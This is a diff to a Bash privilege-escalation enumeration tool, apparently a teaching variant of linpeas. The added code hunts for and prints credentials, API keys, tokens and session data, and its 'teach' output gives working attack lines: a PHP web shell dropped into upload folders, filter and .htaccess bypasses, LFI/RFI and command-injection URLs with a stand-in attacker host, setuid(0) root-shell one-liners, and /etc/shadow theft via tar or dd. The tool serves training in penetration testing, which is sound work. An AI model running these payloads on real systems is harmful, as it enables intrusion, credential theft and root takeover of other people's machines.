+                        teach "    1. Direct: echo '<?php system(\$_GET[\"c\"]); ?>' > $upload_path/shell.php"
+                        teach "    2. If .php blocked, try: .php3, .php4, .php5, .phtml, .phar"
+                        teach "    3. Double extension: shell.php.jpg (may bypass filters)"
+                        teach "    4. Null byte: shell.php%00.jpg (older PHP versions)"
+                        teach "    5. .htaccess upload to enable PHP: echo 'AddType application/x-httpd-php .jpg' > $upload_path/.htaccess"
+                    fi
+                    
+                    # Check for existing suspicious files
+                    find "$upload_path" -maxdepth 2 -type f \( -name "*.php" -o -name "*.jsp" -o -name "*.aspx" -o -name "shell.*" -o -name "c99.*" -o -name "r57.*" \) 2>/dev/null | while read suspicious; do
+                        warn "  Suspicious file in uploads: $suspicious"
+                        if grep -iq "system\|exec\|shell_exec\|passthru\|eval" "$suspicious" 2>/dev/null; then
+                            critical "  Existing web shell detected: $suspicious"
+                            vuln "Existing web shell found: $suspicious"
+                        fi
+                    done
+                fi
+            done
+            
+            # === CHECK 3: Configuration Files ===
+            info "Searching for configuration files..."
+            find "$webroot" -maxdepth 3 -type f \( -name "*.conf" -o -name "*.config" -o -name "*config*.php" -o -name ".env" -o -name "*.yml" -o -name "*.yaml" -o -name "*.ini" \) 2>/dev/null | \
+            grep -vE "sample|example|setup-config|default-|node_modules|vendor" | head -15 | while read config; do
+                if [ -r "$config" ]; then
+                    info "  Found config: $config"
+                    
+                    # Check for credentials with better patterns
+                    if grep -iE "(password|passwd|pwd|secret|token|api[_-]?key)[[:space:]]*[=:'\"]" "$config" 2>/dev/null | \
+                       grep -vE "^[[:space:]]*[#;]|example|sample|your_|changeme|<password>|password_here" | head -3 | grep -q "."; then
+                        critical "Config contains credentials: $config"
+                        vuln "Configuration file with credentials: $config"
+                        grep -iE "(password|passwd|secret|token|api[_-]?key)[[:space:]]*[=:'\"]" "$config" 2>/dev/null | \
+                        grep -vE "^[[:space:]]*[#;]|example" | head -3 | while read line; do
+                            log "    $line"
                         done
+                    fi
+                    
+                    # Check if writable
+                    if [ -w "$config" ]; then
+                        vuln "Config file is WRITABLE: $config"
+                        teach "  Modify to add backdoor credentials or change settings"
                     fi
                 fi
             done
             
-            # Check for WordPress (only if not already found)
-            if [ -f "$webroot/wp-config.php" ] && ! echo "$checked_dirs" | grep -q "wp-config"; then
-                vuln "WordPress installation found"
-                teach "Extract DB credentials from wp-config.php"
-                teach "  Check for define('DB_PASSWORD', 'xxxxx')"
-                checked_dirs="$checked_dirs wp-config"
+            # === CHECK 4: WordPress Specific ===
+            if [ -f "$webroot/wp-config.php" ]; then
+                vuln "WordPress installation: $webroot"
+                teach "WordPress enumeration tips:"
+                teach "  • Check wp-config.php for DB credentials"
+                teach "  • Look for wp-config.php.bak, wp-config.php~, wp-config.old"
+                teach "  • Enumerate users: curl http://site/wp-json/wp/v2/users"
+                teach "  • Check plugins for vulnerabilities: ls wp-content/plugins/"
+                teach "  • xmlrpc.php for brute force amplification"
+                
+                # Check for WordPress backups
+                find "$webroot" -maxdepth 1 -type f \( -name "wp-config*.bak" -o -name "wp-config*.old" -o -name "wp-config*~" -o -name "wp-config*.save" \) 2>/dev/null | while read backup; do
+                    if [ -r "$backup" ]; then
+                        critical "WordPress config backup readable: $backup"
+                        vuln "WordPress backup file: $backup"
+                    fi
+                done
             fi
+            
+            # === CHECK 5: Framework Detection ===
+            info "Detecting web frameworks..."
+            
+            # Laravel
+            if [ -f "$webroot/.env" ] || [ -d "$webroot/storage" ]; then
+                info "  Laravel framework detected"
+                if [ -r "$webroot/.env" ]; then
+                    critical "Laravel .env file readable: $webroot/.env"
+                    vuln "Laravel .env exposed"
+                fi
+            fi
+            
+            # Django
+            if [ -f "$webroot/manage.py" ] || find "$webroot" -name "settings.py" 2>/dev/null | grep -q "."; then
+                info "  Django framework detected"
+                find "$webroot" -name "settings.py" -readable 2>/dev/null | head -3 | while read settings; do
+                    info "  Django settings: $settings"
+                    if grep -E "SECRET_KEY|DATABASE|PASSWORD" "$settings" 2>/dev/null | grep -q "."; then
+                        vuln "Django settings contain credentials: $settings"
+                    fi
+                done
+            fi
+            
+            # Node.js/Express
+            if [ -f "$webroot/package.json" ]; then
+                info "  Node.js application detected"
+                if [ -r "$webroot/.env" ]; then
+                    critical "Node.js .env file readable"
+                fi
+            fi
+            
+            # Ruby on Rails
+            if [ -d "$webroot/config" ] && [ -f "$webroot/config.ru" ]; then
+                info "  Ruby on Rails detected"
+                if [ -r "$webroot/config/database.yml" ]; then
+                    critical "Rails database.yml readable: $webroot/config/database.yml"
+                    vuln "Rails database config exposed"
+                fi
+            fi
+            
+            # === CHECK 6: .htaccess Files ===
+            info "Checking for .htaccess files..."
+            find "$webroot" -maxdepth 3 -name ".htaccess" -type f 2>/dev/null | while read htaccess; do
+                if [ -r "$htaccess" ]; then
+                    info "  Found .htaccess: $htaccess"
+                    
+                    if [ -w "$htaccess" ]; then
+                        critical ".htaccess is WRITABLE: $htaccess"
+                        vuln "Writable .htaccess: $htaccess"
+                        teach "  Enable PHP in images: echo 'AddType application/x-httpd-php .jpg' >> $htaccess"
+                        teach "  Bypass auth: echo 'Require all granted' >> $htaccess"
+                    fi
+                    
+                    # Check for auth directives
+                    if grep -qE "AuthUserFile|Require valid-user" "$htaccess" 2>/dev/null; then
+                        info "  Protected by HTTP auth"
+                        
+                        # Try to find .htpasswd
+                        local htpasswd=$(grep "AuthUserFile" "$htaccess" 2>/dev/null | awk '{print $2}')
+                        if [ -n "$htpasswd" ] && [ -r "$htpasswd" ]; then
+                            critical "Password file readable: $htpasswd"
+                            vuln "HTTP auth password file exposed: $htpasswd"
+                            teach "  Crack with: john $htpasswd"
+                        fi
+                    fi
+                fi
+            done
+            
+            # === CHECK 7: Log Files ===
+            info "Checking web server logs for credentials in URLs..."
+            for logfile in "$webroot/../logs/access.log" "/var/log/apache2/access.log" "/var/log/nginx/access.log"; do
+                if [ -r "$logfile" ]; then
+                    # Look for credentials passed in GET parameters
+                    if grep -iE "password=|passwd=|pwd=|token=|api_key=" "$logfile" 2>/dev/null | tail -5 | grep -q "."; then
+                        warn "Access log contains credentials in URLs: $logfile"
+                        grep -iE "password=|passwd=|pwd=|token=" "$logfile" 2>/dev/null | tail -3 | while read line; do
+                            log "  $line"
+                        done
+                        teach "  Credentials submitted via GET are logged!"
+                    fi
+                fi
+            done
+            
+            # === CHECK 8: Session Files ===
+            for session_dir in "$webroot/../sessions" "/var/lib/php/sessions" "/tmp"; do
+                if [ -d "$session_dir" ]; then
+                    local session_count=$(find "$session_dir" -name "sess_*" -type f 2>/dev/null | wc -l)
+                    if [ $session_count -gt 0 ]; then
+                        info "Found $session_count PHP session files in: $session_dir"
+                        
+                        if [ -r "$session_dir" ]; then
+                            # Check if any sessions contain interesting data
+                            find "$session_dir" -name "sess_*" -type f -readable 2>/dev/null | head -3 | while read session; do
+                                if grep -iE "admin|user|password|token" "$session" 2>/dev/null | grep -q "."; then
+                                    warn "  Session with potential credentials: $session"
+                                fi
+                            done
+                        fi
+                    fi
+                fi
+            done
+            
+            # === CHECK 9: Existing Web Shells ===
+            info "Scanning for existing web shells..."
+            local shell_patterns="c99|r57|b374k|wso|shell|cmd|eval\(|base64_decode|system\(|exec\(|passthru\("
+            
+            find "$webroot" -maxdepth 3 -type f \( -name "*.php" -o -name "*.phtml" \) 2>/dev/null | while read phpfile; do
+                # Check file for shell signatures
+                if grep -iE "$shell_patterns" "$phpfile" 2>/dev/null | head -1 | grep -q "."; then
+                    # Avoid false positives from legitimate code
+                    local suspicious_count=$(grep -icE "system\(|exec\(|shell_exec\(|passthru\(|eval\(" "$phpfile" 2>/dev/null)
+                    if [ $suspicious_count -gt 2 ]; then
+                        critical "Potential web shell: $phpfile (confidence: high)"
+                        vuln "Possible existing web shell: $phpfile"
+                        teach "  Analyze: cat $phpfile | head -20"
+                    fi
+                fi
+            done
         fi
     done
     
-    # Check for running web servers
+    # === CHECK 10: Running Web Server Detection ===
     if netstat -tuln 2>/dev/null | grep -qE ":80 |:443 |:8080 "; then
         info "Web server is listening on common ports"
-        teach "Enumerate the web application for:"
+        
+        # Identify web server type
+        if ps aux | grep -iE "apache2|httpd" | grep -v grep | grep -q "."; then
+            info "Apache web server detected"
+            teach "Apache exploitation tips:"
+            teach "  • Check for writable .htaccess"
+            teach "  • Look for mod_cgi with writable cgi-bin"
+            teach "  • Check Apache version for CVEs"
+        fi
+        
+        if ps aux | grep -i nginx | grep -v grep | grep -q "."; then
+            info "Nginx web server detected"
+            teach "Nginx exploitation tips:"
+            teach "  • Check nginx.conf for misconfigurations"
+            teach "  • Look for path traversal via alias directive"
+            teach "  • Check for writable sites-enabled configs"
+        fi
+        
+        teach "\nGeneral web exploitation:"
         teach "  • LFI: /index.php?page=../../../../etc/passwd"
-        teach "  • RCE: Look for file upload, command injection"
-        teach "  • SQLi: Test input fields and URL parameters"
+        teach "  • RFI: /index.php?page=http://attacker/shell.txt"
+        teach "  • Command injection: /script.php?file=test;whoami"
+        teach "  • SQL injection in parameters"
     fi
+    
+    # === Summary ===
+    log ""
+    info "Web application enumeration complete"
+    teach "Key web attack vectors:"
+    teach "  1. Writable web root = direct shell upload"
+    teach "  2. Writable upload directories with PHP execution"
+    teach "  3. Config files with DB credentials"
+    teach "  4. Existing web shells from previous compromise"
+    teach "  5. Framework-specific vulnerabilities"
 }
-
 # === POST-EXPLOITATION ===
 enum_post_exploit() {
     [ $EXTENDED -eq 0 ] && return
@@ -1164,6 +1864,145 @@ enum_language_creds() {
             grep -iE "connectionstring|password|secret" "$config" 2>/dev/null | head -3
         fi
     done
+}
+# ============================================
+# API Keys and Token Search
+# ============================================
+enum_api_keys() {
+    section "API KEYS & TOKEN DISCOVERY"
+    
+    explain_concept "API Key Exposure" \
+        "Modern applications use API keys and tokens for authentication. These are often hardcoded in files, environment variables, or configuration." \
+        "Developers hardcode credentials for testing and forget to remove them. CI/CD systems store secrets in config files. API keys provide direct access to cloud resources, databases, payment systems, and third-party services. One leaked AWS key can compromise entire infrastructure." \
+        "Common patterns:\n  • AWS: AKIA[0-9A-Z]{16}\n  • GitHub: ghp_, gho_, ghs_\n  • Slack: xox[baprs]-\n  • Google API: AIza[0-9A-Za-z\\-_]{35}\n  • Stripe: sk_live_, pk_live_"
+    
+    info "Searching for API keys and tokens in common locations (this can take several minutes)..."
+    warn "Press ENTER to skip this check and continue to next enumeration."
+    
+    # Define regex patterns
+    local aws_pattern='AKIA[0-9A-Z]{16}'
+    local github_pattern='gh[ps]_[0-9a-zA-Z]{36}'
+    local slack_pattern='xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,32}'
+    local google_pattern='AIza[0-9A-Za-z\-_]{35}'
+    local stripe_pattern='[sr]k_live_[0-9a-zA-Z]{24,}'
+    local jwt_pattern='eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
+    
+    # Exclusion pattern for binary files, caches, and false positive locations
+    local exclude_patterns="teachpeas|learnpeas|linpeas|\.git|node_modules|\.cache|IndexedDB|\.sqlite|\.db|\.bin|[Cc]ache|\.ico|\.woff|\.ttf|\.eot|\.svg|Extensions|/etc/chromium"
+    
+    # Search in common locations
+    local search_paths=("/home" "/var/www" "/opt" "/etc" "/tmp")
+    local total_paths=${#search_paths[@]}
+    local current=0
+    local skip_api_keys=false
+    
+    # Function to check if user pressed Enter
+    check_skip() {
+        if read -t 0.01; then
+            skip_api_keys=true
+            echo -ne "\r\033[K" >&2
+            info "Skipping API key enumeration..."
+            return 1
+        fi
+        return 0
+    }
+    
+    for path in "${search_paths[@]}"; do
+        [ ! -d "$path" ] && continue
+        check_skip || break
+        
+        current=$((current + 1))
+        
+        echo -ne "\r[INFO] Searching $path... ($current/$total_paths) - Press ENTER to skip" >&2
+        
+        # AWS Keys - added -I to skip binary files
+        check_skip || break
+        local aws_results=$(grep -rInE "$aws_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -3)
+        if [ -n "$aws_results" ]; then
+            echo -ne "\r\033[K" >&2  # Clear progress line
+            critical "AWS ACCESS KEY FOUND in $path - Full cloud access possible"
+            vuln "AWS access key detected"
+            echo "$aws_results" | while IFS=: read -r file line_num rest; do
+                log "  File: $file (line $line_num)"
+            done
+        fi
+        
+        # GitHub Tokens - added -I to skip binary files
+        check_skip || break
+        local github_results=$(grep -rInE "$github_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -3)
+        if [ -n "$github_results" ]; then
+            echo -ne "\r\033[K" >&2
+            critical "GITHUB TOKEN FOUND in $path - Repository access possible"
+            vuln "GitHub token detected"
+            echo "$github_results" | while IFS=: read -r file line_num rest; do
+                log "  File: $file (line $line_num)"
+            done
+        fi
+        
+        # Slack Tokens - added -I to skip binary files
+        check_skip || break
+        local slack_results=$(grep -rInE "$slack_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
+        if [ -n "$slack_results" ]; then
+            echo -ne "\r\033[K" >&2
+            warn "Slack token detected in: $path"
+            echo "$slack_results" | while IFS=: read -r file line_num rest; do
+                log "  File: $file (line $line_num)"
+            done
+        fi
+        
+        # Google API Keys - added -I to skip binary files
+        check_skip || break
+        local google_results=$(grep -rInE "$google_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
+        if [ -n "$google_results" ]; then
+            echo -ne "\r\033[K" >&2
+            warn "Google API key detected in: $path"
+            echo "$google_results" | while IFS=: read -r file line_num rest; do
+                log "  File: $file (line $line_num)"
+            done
+        fi
+        
+        # Stripe Keys - added -I to skip binary files
+        check_skip || break
+        local stripe_results=$(grep -rInE "$stripe_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
+        if [ -n "$stripe_results" ]; then
+            echo -ne "\r\033[K" >&2
+            critical "STRIPE API KEY FOUND in $path - Payment system access"
+            vuln "Stripe key detected"
+            echo "$stripe_results" | while IFS=: read -r file line_num rest; do
+                log "  File: $file (line $line_num)"
+            done
+        fi
+        
+        # JWT Tokens - added -I to skip binary files
+        check_skip || break
+        if grep -rIE "$jwt_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2 | grep -q "."; then
+            echo -ne "\r\033[K" >&2
+            warn "JWT token detected in: $path"
+            teach "JWT tokens can be decoded at jwt.io to extract user information"
+        fi
+    done
+    
+    echo -ne "\r\033[K" >&2  # Clear final progress line
+    
+    # Check environment variables (only if not skipped)
+    if ! $skip_api_keys; then
+        info "Checking environment variables for secrets..."
+        if env | grep -iE "api_key|api_secret|access_key|secret_key|password|token" | grep -qv "teachpeas"; then
+            warn "Potential secrets in environment variables:"
+            env | grep -iE "api_key|api_secret|access_key|secret_key|password|token" | grep -v "teachpeas" | head -5 | while read line; do
+                log "  $line"
+            done
+        fi
+        
+        teach "\nAPI Key Exploitation:"
+        teach "  • AWS keys: Use aws-cli to enumerate and pivot"
+        teach "  • GitHub tokens: Clone private repos, read secrets"
+        teach "  • Slack tokens: Read messages, exfiltrate data"
+        teach "  • Stripe keys: Access payment/customer data"
+    fi
+    
+    # Clear any remaining input
+    read -t 0.01 -n 10000 discard 2>/dev/null || true
 }
 
 # === ENHANCED DATABASE CHECKS ===
@@ -1578,6 +2417,70 @@ enum_scheduled() {
         done
     fi
 }
+# ============================================
+# Process Monitoring for Cron
+# ============================================
+
+# ============================================
+# Process Monitoring for Cron
+# ============================================
+
+enum_process_monitor() {
+    section "PROCESS MONITORING (Hidden Cron Jobs)"
+    
+    explain_concept "Process Monitoring for Cron Detection" \
+        "Many cron jobs run every 1-5 minutes but aren't listed in crontab files. Monitoring processes reveals these hidden scheduled tasks." \
+        "Cron jobs may be in user crontabs, system cron directories, or systemd timers. Some run so frequently they're easier to detect by watching process creation than finding their config. Root cron jobs calling writable scripts = instant privilege escalation." \
+        "This check monitors for 60 seconds. Look for:\n  • Processes appearing repeatedly (every minute)\n  • Root processes calling scripts in writable locations\n  • Backup scripts, monitoring tools, cleanup tasks"
+    
+    warn "Monitoring processes for 60 seconds to detect frequent cron jobs..."
+    warn "Press ENTER to skip this check and continue to next enumeration."
+    
+    local proc_log="/tmp/.procs_$$"
+    local skip_monitor=false
+    
+    # Monitor for 60 seconds or until Enter is pressed
+    for i in {1..60}; do
+        # Check if Enter was pressed (non-blocking)
+        if read -t 0.01; then
+            skip_monitor=true
+            echo ""
+            info "Skipping process monitoring..."
+            break
+        fi
+        
+        ps aux >> "$proc_log"
+        sleep 1
+        echo -ne "\rMonitoring: $i/60 seconds (press ENTER to skip)"
+    done
+    echo ""
+    
+    # Only analyze if we collected some data and didn't skip
+    if [ -f "$proc_log" ] && ! $skip_monitor; then
+        # Analyze for frequent processes
+        info "Analyzing for frequently running processes..."
+        sort "$proc_log" | uniq -c | sort -rn | head -20 | while read count cmd; do
+            if [ $count -gt 5 ]; then
+                warn "Process appeared $count times: $cmd"
+                
+                # Check if it's a script we can write to
+                local script=$(echo "$cmd" | grep -oE '/[^ ]+\.sh|/[^ ]+\.py')
+                if [ -n "$script" ] && [ -w "$script" ]; then
+                    critical "Frequent cron script is WRITABLE: $script"
+                    vuln "This script runs frequently and is writable!"
+                fi
+            fi
+        done
+    elif $skip_monitor && [ -f "$proc_log" ]; then
+        info "Partial data collected before skip - analysis skipped"
+    fi
+    
+    # Cleanup
+    rm -f "$proc_log"
+    
+    # Clear any remaining input
+    read -t 0.01 -n 10000 discard 2>/dev/null || true
+}
 
 # === WORLD-WRITABLE DIRECTORIES ===
 enum_world_writable() {
@@ -1691,86 +2594,475 @@ enum_writable_files() {
     fi
 }
 
-# === CAPABILITIES ===
+# === LINUX CAPABILITIES ===
 enum_capabilities() {
     section "LINUX CAPABILITIES"
     
     explain_concept "Linux Capabilities" \
         "Capabilities split root's power into 38 distinct units. A binary can have specific root-like powers without full root access." \
-        "Example: CAP_NET_BIND_SERVICE allows binding to ports <1024. CAP_SETUID allows changing user IDs. This is more granular than SUID, but CAP_SETUID+CAP_DAC_OVERRIDE = effectively root. Created to avoid giving full SUID root for simple tasks." \
-        "Dangerous capabilities:\n  • cap_setuid = can become any user including root\n  • cap_dac_override = bypass file permission checks\n  • cap_dac_read_search = read any file\n  • cap_sys_admin = broad admin powers\n  • cap_sys_ptrace = debug any process (inject code)"
+        "Traditional Unix has only two privilege levels: root (UID 0) and everyone else. This is too coarse - a web server needs to bind to port 80 (requires root) but shouldn't be able to read all files or kill processes. Capabilities solve this by breaking root's power into specific permissions." \
+        "Why capabilities exist:\n  • Principle of least privilege\n  • Avoid SUID root for simple tasks\n  • Example: ping needs raw sockets (CAP_NET_RAW) but not full root\n  • More granular than 'all or nothing'\n\nDangerous capabilities:\n  • cap_setuid = become any user including root\n  • cap_dac_override = bypass file permission checks\n  • cap_dac_read_search = read any file\n  • cap_sys_admin = broad admin powers\n  • cap_sys_ptrace = debug any process (inject code)"
+    
+    log ""
+    teach "╔════════════════════════════════════════════════════════════╗"
+    teach "║  UNDERSTANDING CAPABILITIES - THE FUNDAMENTALS"
+    teach "╚════════════════════════════════════════════════════════════╝"
+    teach ""
+    teach "THE PROBLEM CAPABILITIES SOLVE:"
+    teach ""
+    teach "  Traditional Unix Security Model:"
+    teach "  • Root (UID 0): Can do EVERYTHING"
+    teach "  • Non-root: Can do very little"
+    teach "  • No middle ground"
+    teach ""
+    teach "  Real-world example - ping command:"
+    teach "  • Needs to send raw network packets (requires root)"
+    teach "  • Solution before capabilities: Make ping SUID root"
+    teach "  • Problem: Now ping runs with FULL root privileges"
+    teach "  • Risk: If ping has a bug, attacker gets full root"
+    teach ""
+    teach "  Solution with capabilities:"
+    teach "  • Give ping ONLY CAP_NET_RAW (raw socket access)"
+    teach "  • ping can send packets but can't read files, kill processes, etc."
+    teach "  • Much safer than full SUID root"
+    teach ""
+    teach "CAPABILITY vs SUID - KEY DIFFERENCES:"
+    teach ""
+    teach "  SUID Binary:"
+    teach "  • Runs with ALL permissions of the file owner (usually root)"
+    teach "  • If owner is root = full system control"
+    teach "  • All or nothing approach"
+    teach "  • Example: /usr/bin/passwd is SUID root"
+    teach ""
+    teach "  Capability-enabled Binary:"
+    teach "  • Has SPECIFIC permissions only"
+    teach "  • Can't do anything outside those specific capabilities"
+    teach "  • Granular control"
+    teach "  • Example: ping with CAP_NET_RAW can ONLY send raw packets"
+    teach ""
+    teach "THE 38 CAPABILITIES:"
+    teach "  There are 38 distinct capabilities (as of modern kernels)."
+    teach "  Each represents a specific privilege that root normally has."
+    teach "  Examples:"
+    teach "  • CAP_NET_BIND_SERVICE: Bind to ports < 1024"
+    teach "  • CAP_NET_RAW: Use raw sockets (ping, traceroute)"
+    teach "  • CAP_SETUID: Change user ID (become another user)"
+    teach "  • CAP_DAC_OVERRIDE: Bypass file read/write/execute checks"
+    teach "  • CAP_SYS_ADMIN: Perform system administration operations"
+    teach ""
+    log ""
     
     local caps_found=0
     
-    getcap -r / 2>/dev/null | while read line; do
+    if ! command -v getcap >/dev/null 2>&1; then
+        warn "getcap not available (install libcap2-bin to check capabilities)"
+        return
+    fi
+    
+    info "Scanning for binaries with capabilities..."
+    log ""
+    
+    local caps_found=0
+    local has_dangerous_caps=0
+    
+    # First pass - check if any capabilities exist at all
+    local cap_output=$(getcap -r / 2>/dev/null)
+    
+    if [ -z "$cap_output" ]; then
+        ok "No capabilities found on this system"
+        log ""
+        teach "No binaries have elevated capabilities set. This is common - most"
+        teach "systems use SUID instead. Capabilities are explicitly set by admins"
+        teach "with the setcap command, so their absence is normal."
+        return
+    fi
+    
+    # Check if any dangerous capabilities exist
+    if echo "$cap_output" | grep -qE "cap_setuid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace|cap_sys_module"; then
+        has_dangerous_caps=1
+    fi
+    
+    # Only show educational framework if dangerous capabilities found
+    if [ $has_dangerous_caps -eq 1 ]; then
+        log ""
+        teach "╔════════════════════════════════════════════════════════════╗"
+        teach "║  UNDERSTANDING CAPABILITIES - THE FUNDAMENTALS"
+        teach "╚════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "THE PROBLEM CAPABILITIES SOLVE:"
+        teach ""
+        teach "  Traditional Unix Security Model:"
+        teach "  • Root (UID 0): Can do EVERYTHING"
+        teach "  • Non-root: Can do very little"
+        teach "  • No middle ground"
+        teach ""
+        teach "  Real-world example - ping command:"
+        teach "  • Needs to send raw network packets (requires root)"
+        teach "  • Solution before capabilities: Make ping SUID root"
+        teach "  • Problem: Now ping runs with FULL root privileges"
+        teach "  • Risk: If ping has a bug, attacker gets full root"
+        teach ""
+        teach "  Solution with capabilities:"
+        teach "  • Give ping ONLY CAP_NET_RAW (raw socket access)"
+        teach "  • ping can send packets but can't read files, kill processes, etc."
+        teach "  • Much safer than full SUID root"
+        teach ""
+        teach "CAPABILITY vs SUID - KEY DIFFERENCES:"
+        teach ""
+        teach "  SUID Binary:"
+        teach "  • Runs with ALL permissions of the file owner (usually root)"
+        teach "  • If owner is root = full system control"
+        teach "  • All or nothing approach"
+        teach "  • Example: /usr/bin/passwd is SUID root"
+        teach ""
+        teach "  Capability-enabled Binary:"
+        teach "  • Has SPECIFIC permissions only"
+        teach "  • Can't do anything outside those specific capabilities"
+        teach "  • Granular control"
+        teach "  • Example: ping with CAP_NET_RAW can ONLY send raw packets"
+        teach ""
+        log ""
+    fi
+    
+    # Now process the capabilities
+    echo "$cap_output" | while read line; do
         local bin=$(echo "$line" | awk '{print $1}')
         local caps=$(echo "$line" | awk '{print $3}')
         
+        caps_found=1
+        
+        # Check for CAP_SETUID
         if echo "$caps" | grep -q "cap_setuid"; then
             critical "CAP_SETUID on $bin - Become root immediately"
             vuln "CAP_SETUID found: $bin"
-            caps_found=1
-            
-            teach "This binary can change UIDs via setuid() syscall. Exploitation:"
+            log ""
+            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "║  CAP_SETUID - Change User ID Capability"
+            teach "╚════════════════════════════════════════════════════════════╝"
+            teach ""
+            teach "WHAT IT IS:"
+            teach "  CAP_SETUID allows a process to change its user ID to any user,"
+            teach "  including root (UID 0). This is the same power the 'su' and"
+            teach "  'sudo' commands use to switch users."
+            teach ""
+            teach "WHY IT EXISTS:"
+            teach "  Some programs need to switch between users:"
+            teach "  • Login programs (switch from login screen to your user)"
+            teach "  • SSH daemon (becomes your user after authentication)"
+            teach "  • su/sudo commands (change to root or other users)"
+            teach ""
+            teach "THE EXPLOITATION:"
+            teach "  The setuid() system call changes the process's user ID."
+            teach "  Normally only root can call setuid(0) to become root."
+            teach "  With CAP_SETUID, ANY process can call setuid(0)!"
+            teach ""
+            teach "  Exploit chain:"
+            teach "  1. Run the binary with CAP_SETUID"
+            teach "  2. Binary inherits the CAP_SETUID capability"
+            teach "  3. Make it call setuid(0) - become root"
+            teach "  4. Spawn a shell - now you're root"
+            teach ""
             
             local basename=$(basename "$bin")
             case $basename in
                 python*|python)
+                    teach "EXPLOITATION FOR PYTHON:"
+                    teach "  Python can call setuid() via the os module:"
                     teach "  $bin -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+                    teach ""
+                    teach "  Step by step:"
+                    teach "  1. Import os module (operating system interface)"
+                    teach "  2. os.setuid(0) - Change to UID 0 (root)"
+                    teach "  3. os.system() - Execute /bin/bash as root"
+                    teach "  4. You now have a root shell"
                     ;;
                 perl)
+                    teach "EXPLOITATION FOR PERL:"
+                    teach "  Perl has POSIX module with setuid function:"
                     teach "  $bin -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
+                    teach ""
+                    teach "  Breakdown:"
+                    teach "  1. Load POSIX module"
+                    teach "  2. Call setuid(0)"
+                    teach "  3. exec() replaces current process with /bin/sh"
                     ;;
                 ruby)
+                    teach "EXPLOITATION FOR RUBY:"
+                    teach "  Ruby's Process module handles user switching:"
                     teach "  $bin -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
+                    teach ""
+                    teach "  Process::Sys.setuid(0) changes to root, then spawn shell"
                     ;;
                 php)
+                    teach "EXPLOITATION FOR PHP:"
+                    teach "  PHP has posix_setuid function:"
                     teach "  $bin -r 'posix_setuid(0); system(\"/bin/sh\");'"
+                    teach ""
+                    teach "  -r flag runs PHP code directly"
                     ;;
-                node)
+                node|nodejs)
+                    teach "EXPLOITATION FOR NODE.JS:"
+                    teach "  Node's process object has setuid method:"
                     teach "  $bin -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"
+                    teach ""
+                    teach "  process.setuid(0) becomes root, then spawn interactive shell"
+                    ;;
+                gdb)
+                    teach "EXPLOITATION FOR GDB:"
+                    teach "  GDB can execute system calls:"
+                    teach "  $bin -nx -ex 'python import os; os.setuid(0)' -ex 'shell /bin/sh' -ex quit"
                     ;;
                 *)
-                    teach "  Research how $basename can call setuid(0)"
-                    teach "  Or use GDB to call setuid manually if binary is scriptable"
+                    teach "GENERAL APPROACH:"
+                    teach "  This binary can call setuid(0) to become root."
+                    teach "  Research how $basename can:"
+                    teach "  1. Call the setuid() system call"
+                    teach "  2. Execute shell commands"
+                    teach "  3. If it's a scripting language, use its setuid function"
+                    teach "  4. If it's compiled, use GDB to call setuid manually"
+                    teach ""
+                    teach "  GDB method (works for any binary):"
+                    teach "  gdb -q $bin"
+                    teach "  (gdb) call (int)setuid(0)"
+                    teach "  (gdb) shell /bin/sh"
                     ;;
             esac
+            log ""
         fi
         
+        # Check for CAP_DAC_READ_SEARCH
         if echo "$caps" | grep -q "cap_dac_read_search"; then
             critical "CAP_DAC_READ_SEARCH on $bin - Read /etc/shadow and SSH keys"
             vuln "CAP_DAC_READ_SEARCH found: $bin"
-            teach "This binary can bypass file read permission checks"
-            teach "  Use it to read /etc/shadow, SSH keys, /root/.bash_history"
-            teach "  Example: tar -cf /tmp/shadow.tar /etc/shadow"
+            log ""
+            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "║  CAP_DAC_READ_SEARCH - Bypass Read Permission Checks"
+            teach "╚════════════════════════════════════════════════════════════╝"
+            teach ""
+            teach "WHAT IT IS:"
+            teach "  DAC = Discretionary Access Control (normal file permissions)"
+            teach "  This capability bypasses file READ permission checks."
+            teach "  You can read ANY file on the system, regardless of permissions."
+            teach ""
+            teach "WHY IT EXISTS:"
+            teach "  Backup programs need to read all files to create backups."
+            teach "  Instead of running as full root, they get CAP_DAC_READ_SEARCH."
+            teach ""
+            teach "WHAT YOU CAN READ:"
+            teach "  • /etc/shadow (password hashes)"
+            teach "  • /root/.ssh/id_rsa (root's SSH private key)"
+            teach "  • /root/.bash_history (root's command history)"
+            teach "  • Any user's private files"
+            teach "  • Database files, configuration files, etc."
+            teach ""
+            teach "EXPLOITATION:"
+            teach "  The binary can read files but you need to make it DO the reading."
+            teach ""
+            
+            local basename=$(basename "$bin")
+            case $basename in
+                tar)
+                    teach "EXPLOITATION WITH TAR:"
+                    teach "  tar can archive (and thus read) any file:"
+                    teach "  $bin -czf /tmp/shadow.tar.gz /etc/shadow"
+                    teach "  cd /tmp && tar -xzf shadow.tar.gz"
+                    teach "  cat etc/shadow"
+                    teach ""
+                    teach "  Now crack the hashes with john or hashcat"
+                    ;;
+                dd)
+                    teach "EXPLOITATION WITH DD:"
+                    teach "  dd reads and writes raw data:"
+                    teach "  $bin if=/etc/shadow of=/tmp/shadow"
+                    teach "  cat /tmp/shadow"
+                    ;;
+                rsync)
+                    teach "EXPLOITATION WITH RSYNC:"
+                    teach "  $bin /etc/shadow /tmp/shadow"
+                    teach "  cat /tmp/shadow"
+                    ;;
+                *)
+                    teach "GENERAL APPROACH:"
+                    teach "  If $basename can read files, use it to read sensitive files:"
+                    teach "  • /etc/shadow - crack passwords offline"
+                    teach "  • /root/.ssh/id_rsa - use for SSH access"
